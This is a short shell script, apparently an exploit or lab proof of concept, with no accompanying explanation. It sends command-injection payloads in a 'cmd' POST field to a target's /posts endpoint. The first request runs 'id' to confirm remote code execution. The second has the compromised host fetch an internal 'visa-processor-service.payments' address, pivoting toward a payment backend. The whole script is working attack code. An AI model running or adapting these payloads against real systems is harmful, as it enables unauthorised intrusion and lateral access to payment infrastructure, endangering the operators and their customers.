if [ $# -eq 0 ]
then
echo  "try: ./$0 ip:port"
exit 1
fi

wget -q -O - --post-data 'cmd=id' https://$1/posts

echo "Connecting to VISA-PROCESSOR.." && wget -q -O - --post-data 'cmd=wget -O - http://visa-processor-service.payments:8080' https://$1/posts
